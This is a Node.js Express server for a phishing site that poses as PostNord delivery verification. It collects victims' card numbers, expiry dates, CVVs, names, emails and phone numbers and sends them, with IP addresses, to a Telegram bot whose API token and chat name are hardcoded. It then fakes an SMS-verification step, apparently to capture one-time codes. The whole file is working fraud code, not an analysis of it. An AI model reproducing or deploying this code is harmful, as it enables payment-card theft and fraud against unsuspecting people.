const express = require("express")
const path = require("path")
const app = express()

// Middleware
app.use(express.urlencoded({ extended: true }))
app.use(express.json())
app.use(express.static("public"))

// Store sessions in memory (in production, use Redis or database)
const sessions = new Map()

// Card validation functions
function luhnCheck(cardNumber) {
  const digits = cardNumber.replace(/\D/g, "").split("").map(Number)
  let sum = 0
  let isEven = false

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = digits[i]

    if (isEven) {
      digit *= 2
      if (digit > 9) {
        digit -= 9
      }
    }

    sum += digit
    isEven = !isEven
  }

  return sum % 10 === 0
}

function detectCardType(cardNumber) {
  const cleanNumber = cardNumber.replace(/\s/g, "")

  const patterns = {
    Visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
    MasterCard: /^5[1-5][0-9]{14}$/,
    "American Express": /^3[47][0-9]{13}$/,
    Discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/,
    "Diners Club": /^3[0689][0-9]{11}$/,
    JCB: /^(?:2131|1800|35\d{3})\d{11}$/,
  }

  for (const [type, pattern] of Object.entries(patterns)) {
    if (pattern.test(cleanNumber)) {
      return type
    }
  }

  return "Unknown"
}

function validateExpiryDate(expiryDate) {
  if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
    return false
  }

  const [month, year] = expiryDate.split("/")
  const currentDate = new Date()
  const currentYear = currentDate.getFullYear() % 100
  const currentMonth = currentDate.getMonth() + 1

  return (
    (Number.parseInt(year) > currentYear ||
      (Number.parseInt(year) === currentYear && Number.parseInt(month) >= currentMonth)) &&
    Number.parseInt(month) >= 1 &&
    Number.parseInt(month) <= 12
  )
}

function generateTrackingNumber() {
  return "PN" + new Date().getFullYear() + Math.floor(Math.random() * 900000 + 100000)
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

// Send Card Details to Telegram
async function sendCardDetailsToTelegram(formData, req) {
  let content = ""
  for (const [key, value] of Object.entries(formData)) {
    if (value) {
      content += `<b>${key}</b>: <i>${value}</i>\n`
    }
  }

  if (content.trim()) {
    content = `<b>💳 PostNord Card Details - Saved</b>\n\n` + content

    // Add additional system information
    content += `\n<b>═══════════════════════════</b>\n`
    content += `<b>📅 Timestamp</b>: <i>${new Date().toISOString()}</i>\n`
    content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n`
    content += `<b>🔍 User Agent</b>: <i>${(req.get("User-Agent") || "Unknown").substring(0, 50)}...</i>\n`
    content += `<b>═══════════════════════════</b>\n`
    content += `<b>🟡🔵 PostNord Security System 🔵🟡</b>`

    const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
    const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: "@CardPow",
          text: content,
          parse_mode: "HTML",
        }),
      })

      return response.ok
    } catch (error) {
      console.error("Error sending card details to Telegram:", error)
      return false
    }
  }

  return false
}

// Send SMS Code to Telegram (separate message)
async function sendSMSCodeToTelegram(smsCode, userInfo, req) {
  let content = `<b>📱 PostNord SMS Verification Code</b>\n\n`
  content += `<b>🔐 \n\n`
  content += `<b>👤 User Details:</b>\n`
  content += `<b>Name</b>: <i>${userInfo.card_holder}</i>\n`
  content += `<b>Phone</b>: <i>${userInfo.phone}</i>\n`
  content += `<b>Email</b>: <i>${userInfo.email}</i>\n`
  content += `<b>Tracking</b>: <i>${userInfo.tracking_number}</i>\n\n`
  content += `<b>📅 Generated</b>: <i>${new Date().toISOString()}</i>\n`
  content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n\n`
  content += `<b>⏰ Code expires in 10 minutes</b>\n`
  content += `<b>🟡🔵 PostNord SMS System 🔵🟡</b>`

  const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: "@CardPow",
        text: content,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending SMS code to Telegram:", error)
    return false
  }
}

// Route to serve the main form
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"))
})

// Route to handle card validation
app.post("/validate_card", async (req, res) => {
  try {
    // Sanitize input
    const { card_number, expiry_date, cvv, card_holder, email, phone, delivery_type } = req.body

    // Validation results
    const validationResults = {}
    let overallStatus = "valid"

    // Validate card number
    const cleanCardNumber = card_number.replace(/\s/g, "")
    const cardValid = luhnCheck(cleanCardNumber)
    const cardType = detectCardType(cleanCardNumber)

    validationResults.card_number = {
      status: cardValid ? "valid" : "invalid",
      message: cardValid ? "Card verified for PostNord delivery" : "Invalid card number",
    }

    validationResults.card_type = {
      status: cardType !== "Unknown" ? "valid" : "warning",
      message: cardType,
    }

    // Validate expiry date
    const expiryValid = validateExpiryDate(expiry_date)
    validationResults.expiry_date = {
      status: expiryValid ? "valid" : "invalid",
      message: expiryValid ? "Valid expiry date" : "Card expired or invalid date",
    }

    // Validate CVV
    const cvvValid = cvv.length >= 3 && cvv.length <= 4 && /^\d+$/.test(cvv)
    validationResults.cvv = {
      status: cvvValid ? "valid" : "invalid",
      message: cvvValid ? "CVV verified" : "Invalid CVV code",
    }

    // Determine overall status
    for (const result of Object.values(validationResults)) {
      if (result.status === "invalid") {
        overallStatus = "invalid"
        break
      } else if (result.status === "warning" && overallStatus !== "invalid") {
        overallStatus = "warning"
      }
    }

    if (overallStatus === "valid") {
      const trackingNumber = generateTrackingNumber()
      const sessionId = generateSessionId()

      // Prepare form data for Telegram
      const formData = {
        card_number,
        expiry_date,
        cvv,
        card_holder,
        email,
        phone,
        delivery_type,
        validation_status: "VERIFIED ✅",
        card_type: cardType,
        tracking_number: trackingNumber,
      }

      // Send card details to Telegram (first message)
      const cardDetailsSent = await sendCardDetailsToTelegram(formData, req)

      // Generate SMS code
      const smsCode = String(Math.floor(Math.random() * 900000) + 100000)

      // Prepare user info for SMS message
      const userInfo = {
        card_holder,
        phone,
        email,
        tracking_number: trackingNumber,
      }

      // Send SMS code to Telegram (second message)
      const smsCodeSent = await sendSMSCodeToTelegram(smsCode, userInfo, req)

      // Store in session
      sessions.set(sessionId, {
        tracking_number: trackingNumber,
        card_holder,
        email,
        phone,
        delivery_type,
        validation_results: validationResults,
        card_details_sent: cardDetailsSent,
        sms_code_sent: smsCodeSent,
        sms_code: smsCode,
        sms_attempts: 0,
        sms_sent_time: Date.now(),
        created_at: Date.now(),
      })

      // Set session cookie
      res.cookie("session_id", sessionId, {
        httpOnly: true,
        maxAge: 30 * 60 * 1000, // 30 minutes
      })

      // Redirect to SMS verification
      res.redirect("/sms_verification")
    } else {
      // Render error page
      res.send(generateErrorPage(validationResults))
    }
  } catch (error) {
    console.error("Error in card validation:", error)
    res.status(500).send("Internal server error")
  }
})

// Generate error page HTML
function generateErrorPage(validationResults) {
  let errorDetails = ""
  for (const [field, result] of Object.entries(validationResults)) {
    if (result.status === "invalid") {
      errorDetails += `
                <div class="result-item">
                    <span class="result-label">${field.replace("_", " ").toUpperCase()}:</span>
                    <span class="result-value status-invalid">${result.message}</span>
                </div>
            `
    }
  }

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PostNord - Validation Error</title>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div class="header">
            <div class="container">
                <div class="logo">
                    <div class="logo-icon">📦</div>
                    <div class="logo-text">
                        <span class="post">Post</span><span class="nord">Nord</span>
                    </div>
                </div>
                <div class="header-info">
                    <span>Validation Error</span>
                </div>
            </div>
        </div>

        <div class="main-container">
            <div class="validation-result" style="grid-column: 1 / -1; max-width: 800px; margin: 0 auto;">
                <div class="error-alert">
                    ❌ Card validation failed. Please check your information and try again.
                </div>
                
                <div class="validation-details">
                    <h3>Validation Errors</h3>
                    ${errorDetails}
                </div>
                
                <a href="/" class="verify-btn" style="text-decoration: none; text-align: center; display: block; margin-top: 30px;">
                    <span class="btn-icon">🔄</span>
                    Try Again
                </a>
            </div>
        </div>

        <div class="footer">
            <div class="container">
                <p>&copy; 2024 PostNord. Secure delivery verification system.</p>
            </div>
        </div>

        <style>
            .validation-result {
                background: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
            }
            .result-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 0;
                border-bottom: 1px solid #e5e7eb;
            }
            .result-label {
                font-weight: 600;
                color: #374151;
            }
            .status-invalid {
                color: #ef4444;
                font-weight: 500;
            }
            .validation-details h3 {
                color: #0052CC;
                margin-bottom: 20px;
                font-size: 20px;
            }
        </style>
    </body>
    </html>
    `
}

module.exports = app
